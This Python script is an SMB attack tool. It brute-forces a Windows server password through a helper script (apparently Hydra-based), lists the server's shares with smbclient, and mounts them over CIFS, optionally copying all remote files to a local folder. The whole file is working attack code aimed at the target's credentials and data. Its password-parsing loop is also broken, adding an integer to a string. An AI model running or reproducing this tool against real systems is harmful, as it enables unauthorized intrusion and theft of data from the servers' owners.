import argparse as ag
import os 
from subprocess import call
import sys
import shutil
from contextlib import redirect_stdout
from pathlib import Path

def parseVulnerabilitiesFile(f):
	mountpoints = []
	lines = f.readlines()
	#print (lines)
	for i in range(3,len(lines)):
		line = lines[i]
		#print (line)
		name = line.split()[0]
		if(name == "Reconnecting"):
			break
		if(not name.endswith("$")):
			mountpoints.append(name)
		
	return mountpoints

def performAttack(location, serverIP, username, password=None, copy=False):
	if (password is None):
		f=open("password.txt", "w")
		call(["python3", "hyd.py", "-u", username, "-i", serverIP], stdout=f)
		f.close()
		f = open("password.txt", "r")
		lines = f.readlines()
		for line in lines:
			#print (line)
			if "[445][smb]" in line:
				words = line.split()
				pwdIndex = words.index("password:")
				endWordIndex = len(words)-pwdIndex
				password = words[pwdIndex+1]
				for i in range(pwdIndex+1, len(password)):
					password += pwdIndex+1
		f.close()
		os.remove("password.txt")
		print ("Cracked Password:" + password)
	try:	
		shutil.rmtree(location)	
	except FileNotFoundError:
		pass
	
	f = open('vulnerableMountPoints.txt', 'w')
	#with redirect_stdout(f):

	mountpointParams = ["smbclient", "-U=" + username + "%" + password, "-L", serverIP]
	call (mountpointParams, stdout=f)
	f.close()
	f = open('vulnerableMountPoints.txt', 'r')
	mountpoints = parseVulnerabilitiesFile(f)
	f.close()

	if len(mountpoints) == 0:
		print ("No mountpoint found")
	
	
	elif len(mountpoints) == 1:
		os.mkdir(location)
		mountpoint = mountpoints[0]
		if copy:
			mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, "./assets/tempMount"]
			call(mountArgs)
			copyMountFiles = ["cp", "-a", "./assets/tempMount/.", location]
			call(copyMountFiles)
			unMount = ["umount", "./assets/tempMount/"]
			call(unMount)	
		else:
			mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
			call(mountArgs)
			print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + location)
	else:
		os.mkdir(location)
		if copy:
			#Each subdirectory directly under the main mount location is a separate mount point on the remote target
			for i in range(len(mountpoints)):
				mountpoint = mountpoints[i]
				tempLocation = location + "/" + mountpoint
				os.mkdir(tempLocation)
				mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, "./assets/tempMount"]
				call(mountArgs)
				copyMountFiles = ["cp", "-a", "./assets/tempMount/.", tempLocation]
				call(copyMountFiles)
				unMount = ["umount", "./assets/tempMount/"]
				call(unMount)
				
		else:
			lastFolder = str.split(location, "/")
			lastFolder = lastFolder[len(lastFolder)-1]
			location = location + "/" + lastFolder
			for i in range(len(mountpoints)):
				mountpoint = mountpoints[i]
				tempLocation = location + "-" + str(i)
				os.mkdir(tempLocation)
				mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, tempLocation]
				call(mountArgs)
				print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + tempLocation)
	
	os.remove("vulnerableMountPoints.txt")
		

def bruteForcePassword():
	return "bruteForcePassword"
parser = ag.ArgumentParser()
parser.add_argument('--mountloc', type=str, help="Enter the location to mount the system")
parser.add_argument('--serverIP', type=str, help="Enter the name of the targer windows server")
parser.add_argument('--username', type=str, help="Enter the username of the target windows server")
parser.add_argument('--password', type=str, help="Optional. Enter the password of the target windows server. If not included, password will be brute forced.")
parser.add_argument('--copy', type=str, help="Optional.  If set, the mount will create a copy of the target instead of actually mounting the filesystem on the remote target", required=False)

args = parser.parse_args()
copy = False
if args.copy == "True":
	copy = True
if args.password:
	performAttack(args.mountloc, args.serverIP, args.username, args.password, copy=copy)
else:
	performAttack(args.mountloc, args.serverIP, args.username, copy=copy)

